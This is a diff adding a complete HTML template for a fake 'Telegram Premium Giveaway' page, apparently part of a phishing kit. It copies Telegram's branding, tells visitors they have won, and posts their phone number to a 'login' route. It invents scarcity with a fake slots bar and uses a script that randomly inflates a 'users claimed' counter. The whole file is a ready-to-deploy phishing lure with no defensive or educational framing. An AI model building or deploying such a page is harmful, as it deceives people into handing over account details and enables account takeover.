@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Premium Giveaway</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #17212b;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #ffffff;
+        }
+        .container {
+            background-color: #1f2936;
+            padding: 2.5rem;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+            width: 100%;
+            max-width: 430px;
+            text-align: center;
+        }
+        .logo {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 1.5rem;
+            filter: drop-shadow(0 2px 5px rgba(0, 0, 0, 0.2));
+        }
+        h1 {
+            color: #ffffff;
+            margin-bottom: 1.2rem;
+            font-size: 2rem;
+            font-weight: 700;
+        }
+        .premium-badge {
+            background: linear-gradient(135deg, #8774E1, #6454c7);
+            color: white;
+            padding: 0.6rem 1.2rem;
+            border-radius: 30px;
+            display: inline-block;
+            margin-bottom: 1.5rem;
+            font-weight: bold;
+            font-size: 1.1rem;
+            box-shadow: 0 2px 8px rgba(135, 116, 225, 0.4);
+        }
+        .description {
+            color: #adbac7;
+            margin-bottom: 2.2rem;
+            line-height: 1.6;
+            font-size: 1.1rem;
+        }
+        .form-group {
+            margin-bottom: 1.5rem;
+            text-align: left;
+        }
+        .phone-input-container {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            width: 100%;
+        }
+        .country-code-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+            padding: 0.6rem 1rem;
+            background-color: #2c3847;
+            border: 1px solid #374151;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-bottom: 10px;
+        }
+        .country-code-wrapper:hover {
+            border-color: #8774E1;
+        }
+        .country-code-wrapper.highlight {
+            border-color: #8774E1;
+            background-color: #364253;
+            transition: all 0.2s ease;
+        }
+        .country-flag {
+            font-size: 1.5rem;
+            margin-right: 10px;
+        }
+        .country-select {
+            width: 100%;
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            opacity: 0;
+            cursor: pointer;
+            z-index: 2;
+        }
+        .dropdown-icon {
+            position: absolute;
+            right: 15px;
+            font-size: 0.7rem;
+            color: #8774E1;
+        }
+        .phone-input {
+            flex-grow: 1;
+            padding: 1rem;
+            height: 52px;
+        }
+        label {
+            display: block;
+            margin-bottom: 0.6rem;
+            color: #d1d5db;
+            font-weight: 500;
+        }
+        select, input {
+            width: 100%;
+            padding: 0.7rem;
+            border: 1px solid #374151;
+            border-radius: 8px;
+            box-sizing: border-box;
+            height: 48px;
+            background-color: #2c3847;
+            color: #ffffff;
+            font-size: 1rem;
+        }
+        select:focus, input:focus {
+            outline: none;
+            border-color: #8774E1;
+            box-shadow: 0 0 0 2px rgba(135, 116, 225, 0.3);
+        }
+        button {
+            background: linear-gradient(135deg, #8774E1, #6454c7);
+            color: white;
+            border: none;
+            padding: 0.9rem 1.5rem;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 1.1rem;
+            font-weight: bold;
+            box-shadow: 0 2px 8px rgba(135, 116, 225, 0.4);
+            transition: all 0.2s ease;
+        }
+        button:hover {
+            background: linear-gradient(135deg, #6454c7, #5545b8);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(135, 116, 225, 0.5);
+        }
+        button:active {
+            transform: translateY(0);
+        }
+        .error {
+            color: #ef4444;
+            margin-bottom: 1.2rem;
+            text-align: center;
+            background-color: rgba(239, 68, 68, 0.1);
+            padding: 0.8rem;
+            border-radius: 8px;
+            font-weight: 500;
+        }
+        .features {
+            text-align: left;
+            margin-bottom: 2.5rem;
+            background-color: #2c3847;
+            padding: 1.2rem;
+            border-radius: 10px;
+        }
+        .feature {
+            display: flex;
+            align-items: center;
+            margin-bottom: 0.8rem;
+            color: #d1d5db;
+            font-size: 1.05rem;
+        }
+        .feature-icon {
+            margin-right: 0.8rem;
+            color: #8774E1;
+            background-color: rgba(135, 116, 225, 0.2);
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            font-weight: bold;
+        }
+        .limited-offer {
+            background-color: rgba(239, 68, 68, 0.2);
+            color: #ef4444;
+            padding: 0.5rem 1rem;
+            border-radius: 6px;
+            font-size: 0.9rem;
+            font-weight: 500;
+            margin-bottom: 2rem;
+            display: inline-block;
+        }
+        .users-counter {
+            color: #adbac7;
+            font-size: 0.9rem;
+            margin-bottom: 2rem;
+        }
+        .progress-bar {
+            background-color: #2c3847;
+            border-radius: 10px;
+            height: 10px;
+            width: 100%;
+            margin-bottom: 1rem;
+            overflow: hidden;
+        }
+        .progress-fill {
+            background: linear-gradient(135deg, #8774E1, #6454c7);
+            height: 100%;
+            width: 85%;
+            border-radius: 10px;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://telegram.org/img/t_logo.png" alt="Telegram Logo" class="logo">
+        <div class="premium-badge">✨ PREMIUM GIVEAWAY</div>
+        <h1>Congratulations!</h1>
+        <p class="description">You have been randomly selected to receive a <strong>FREE Telegram Premium</strong> subscription for 12 months! Verify your phone number to claim your prize.</p>
+        
+        <div class="limited-offer">🔥 LIMITED TIME OFFER: Only 15% slots remaining</div>
+        
+        <div class="progress-bar">
+            <div class="progress-fill"></div>
+        </div>
+        
+        <p class="users-counter">2,143 users have already claimed this offer</p>
+        
+        <div class="features">
+            <div class="feature">
+                <span class="feature-icon">✓</span> 4GB File Upload Size (vs 2GB for normal users)
+            </div>
+            <div class="feature">
+                <span class="feature-icon">✓</span> 2x Faster Download Speed
+            </div>
+            <div class="feature">
+                <span class="feature-icon">✓</span> 1,000+ Exclusive Premium Stickers
+            </div>
+            <div class="feature">
+                <span class="feature-icon">✓</span> Ad-Free Experience
+            </div>
+            <div class="feature">
+                <span class="feature-icon">✓</span> Premium Profile Badge & Custom Bio
+            </div>
+            <div class="feature">
+                <span class="feature-icon">✓</span> Animated Profile Pictures
+            </div>
+        </div>
+
+        {% if error %}
+        <div class="error">{{ error }}</div>
+        {% endif %}
+        
+        <form method="POST" action="{{ url_for('login') }}">
+            <div class="form-group">
+                <label for="phone">Your Phone Number</label>
+                <div class="phone-input-container">
+                    <div class="country-code-wrapper">
+                        <div class="country-flag" id="selected-flag">🇮🇷</div>
+                        <select id="country_code" name="country_code" class="country-select" required>
+                            <option value="+98" data-flag="🇮🇷" selected>Iran (+98)</option>
+                            <option value="+7" data-flag="🇷🇺">Russia (+7)</option>
+                            <option value="+1" data-flag="🇺🇸">United States (+1)</option>
+                            <option value="+44" data-flag="🇬🇧">United Kingdom (+44)</option>
+                            <option value="+91" data-flag="🇮🇳">India (+91)</option>
+                            <option value="+90" data-flag="🇹🇷">Turkey (+90)</option>
+                            <option value="+49" data-flag="🇩🇪">Germany (+49)</option>
+                            <option value="+33" data-flag="🇫🇷">France (+33)</option>
+                            <option value="+39" data-flag="🇮🇹">Italy (+39)</option>
+                            <option value="+34" data-flag="🇪🇸">Spain (+34)</option>
+                            <option value="+55" data-flag="🇧🇷">Brazil (+55)</option>
+                            <option value="+966" data-flag="🇸🇦">Saudi Arabia (+966)</option>
+                            <option value="+971" data-flag="🇦🇪">UAE (+971)</option>
+                            <option value="+20" data-flag="🇪🇬">Egypt (+20)</option>
+                            <option value="+62" data-flag="🇮🇩">Indonesia (+62)</option>
+                            <option value="+81" data-flag="🇯🇵">Japan (+81)</option>
+                            <option value="+82" data-flag="🇰🇷">South Korea (+82)</option>
+                            <option value="+86" data-flag="🇨🇳">China (+86)</option>
+                            <option value="+84" data-flag="🇻🇳">Vietnam (+84)</option>
+                            <option value="+60" data-flag="🇲🇾">Malaysia (+60)</option>
+                            <option value="+63" data-flag="🇵🇭">Philippines (+63)</option>
+                            <option value="+92" data-flag="🇵🇰">Pakistan (+92)</option>
+                            <option value="+880" data-flag="🇧🇩">Bangladesh (+880)</option>
+                            <option value="+94" data-flag="🇱🇰">Sri Lanka (+94)</option>
+                            <option value="+93" data-flag="🇦🇫">Afghanistan (+93)</option>
+                            <option value="+964" data-flag="🇮🇶">Iraq (+964)</option>
+                            <option value="+963" data-flag="🇸🇾">Syria (+963)</option>
+                            <option value="+962" data-flag="🇯🇴">Jordan (+962)</option>
+                            <option value="+961" data-flag="🇱🇧">Lebanon (+961)</option>
+                            <option value="+380" data-flag="🇺🇦">Ukraine (+380)</option>
+                            <option value="+40" data-flag="🇷🇴">Romania (+40)</option>
+                            <option value="+31" data-flag="🇳🇱">Netherlands (+31)</option>
+                            <option value="+32" data-flag="🇧🇪">Belgium (+32)</option>
+                            <option value="+46" data-flag="🇸🇪">Sweden (+46)</option>
+                            <option value="+41" data-flag="🇨🇭">Switzerland (+41)</option>
+                        </select>
+                        <span class="dropdown-icon">▼</span>
+                    </div>
+                    <input type="tel" id="phone" name="phone" class="phone-input" required placeholder="Phone number" autocomplete="tel">
+                </div>
+            </div>
+            <button type="submit">Claim Your Premium</button>
+        </form>
+        
+        <p style="margin-top: 1.2rem; color: #adbac7; font-size: 0.9rem;">
+            * Verification required to confirm your Telegram account and prevent abuse
+        </p>
+    </div>
+    
+    <script>
+        // Telegram WebApp initialization
+        document.addEventListener('DOMContentLoaded', function() {
+            // Check if we're inside a Telegram WebApp
+            if (window.Telegram && window.Telegram.WebApp) {
+                const webapp = window.Telegram.WebApp;
+                
+                // Initialize the Telegram WebApp
+                webapp.ready();
+                
+                // Set up the main button if we're in Telegram
+                webapp.MainButton.setText('CLAIM PREMIUM');
+                webapp.MainButton.color = '#8774E1';
+                webapp.MainButton.textColor = '#FFFFFF';
+                
+                // When main button is clicked, submit the form
+                webapp.MainButton.onClick(function() {
+                    document.querySelector('form').submit();
+                });
+                
+                // Customize UI for Telegram WebApp
+                document.body.classList.add('in-telegram-webapp');
+                
+                // Show the main button when form is valid
+                const phoneInput = document.getElementById('phone');
+                phoneInput.addEventListener('input', function() {
+                    if (phoneInput.value.length > 5) {
+                        webapp.MainButton.show();
+                    } else {
+                        webapp.MainButton.hide();
+                    }
+                });
+                
+                // Hide our own button if we're in Telegram
+                const regularButton = document.querySelector('button[type="submit"]');
+                regularButton.style.display = 'none';
+            }
+            
+            // Random counter increment
+            setInterval(function() {
+                const counterElement = document.querySelector('.users-counter');
+                const currentCount = parseInt(counterElement.textContent.match(/\d+/)[0]);
+                const newCount = currentCount + Math.floor(Math.random() * 3) + 1;
+                counterElement.textContent = counterElement.textContent.replace(/\d+/, newCount);
+            }, 8000);
+            
+            // Country code selector functionality
+            const countrySelect = document.getElementById('country_code');
+            const selectedFlag = document.getElementById('selected-flag');
+            const countryCodeWrapper = document.querySelector('.country-code-wrapper');
+            
+            // Update flag and text when country is selected
+            countrySelect.addEventListener('change', function() {
+                const selectedOption = this.options[this.selectedIndex];
+                const flag = selectedOption.getAttribute('data-flag');
+                const text = selectedOption.textContent;
+                selectedFlag.textContent = flag;
+                
+                // Add highlight effect
+                countryCodeWrapper.classList.add('highlight');
+                setTimeout(() => {
+                    countryCodeWrapper.classList.remove('highlight');
+                }, 300);
+                
+                // Focus on phone input after country selection
+                document.getElementById('phone').focus();
+            });
+            
+            // Simulate click on wrapper to open select
+            countryCodeWrapper.addEventListener('click', function(e) {
+                if (e.target !== countrySelect) {
+                    countrySelect.click();
+                }
+            });
+            
+            // Slight animation on button hover (only for web version)
+            const claimButton = document.querySelector('button');
+            claimButton.addEventListener('mouseover', function() {
+                this.style.transform = 'translateY(-2px)';
+                this.style.boxShadow = '0 4px 12px rgba(135, 116, 225, 0.5)';
+            });
+            claimButton.addEventListener('mouseout', function() {
+                this.style.transform = 'translateY(0)';
+                this.style.boxShadow = '0 2px 8px rgba(135, 116, 225, 0.4)';
+            });
+        });
+    </script>
+</body>
+</html>
